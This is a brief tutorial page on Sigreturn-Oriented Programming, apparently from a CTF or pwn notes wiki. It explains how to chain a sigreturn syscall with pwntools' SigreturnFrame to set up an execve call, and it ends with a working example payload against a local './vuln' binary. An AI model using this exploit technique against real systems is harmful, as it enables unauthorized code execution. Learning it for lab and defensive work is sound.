---
title: Sigreturn ROP
---
Sigreturn ROP (SROP) is a ROP attack.

Instead of directly calling `sys_execve`, a SROP attack will call `sys_rt_sigreturn` to setup the registers for `sys_execve`, before calling that.

## Sigreturn ROP Chain
To call `sys_rt_sigreturn`, you will need to:
- Set `$rax` to 15 / 0xf
- Execute `syscall`

## SigreturnFrame
Sigreturn will set the register values based on `$rsp` by a specific format.

However, this can be simplified with Pwntool's `SigreturnFrame`.

Before starting, you will need to supply additional context to Pwntools, like so:
```python
elf = context.binary = ELF("./vuln", checksec=False)
p = process()
rop = ROP("./vuln")
```

Now, create a new instance and define the values for the registers. The object expects integers, so no need to use `p64`.
```python
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = BINSH
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL
```

Afterward, convert the object into bytes with `bytes(frame)` and append it into your payload.

## Example Payload
```python
payload = b"A" * 72
payload += p64(rop.rax.address)
payload += p64(0xf)
payload += p64(rop.syscall.address)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = BINSH
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = rop.syscall.address

payload += bytes(frame)
```